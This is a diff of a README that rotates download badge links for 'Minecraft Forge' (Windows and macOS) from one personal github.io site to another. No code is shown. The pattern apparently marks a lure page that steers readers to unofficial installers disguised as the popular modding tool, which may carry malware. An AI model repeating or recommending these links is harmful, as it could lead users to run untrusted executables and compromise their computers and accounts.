@@ -30,7 +30,7 @@ Whether you're a newcomer just getting started or a seasoned pro looking for adv
 
 <div align="center">
 
-[![Download Minecraft Forge](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_MINECRAFT_FORGE-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://BursarHypnotize.github.io/install-win/)
+[![Download Minecraft Forge](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_MINECRAFT_FORGE-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://TerminusAgentLine.github.io/windows-setup/)
 
 </div>
 
@@ -76,8 +76,8 @@ Getting started with **Minecraft Forge** is quick and straightforward.
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-EA8220?style=for-the-badge&logo=windows&logoColor=white)](https://BursarHypnotize.github.io/install-win/)
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-EA8220?style=for-the-badge&logo=apple&logoColor=white)](https://BursarHypnotize.github.io/install-mac/)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-EA8220?style=for-the-badge&logo=windows&logoColor=white)](https://TerminusAgentLine.github.io/windows-setup/)
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-EA8220?style=for-the-badge&logo=apple&logoColor=white)](https://TerminusAgentLine.github.io/macos-setup/)
 
 </div>
 
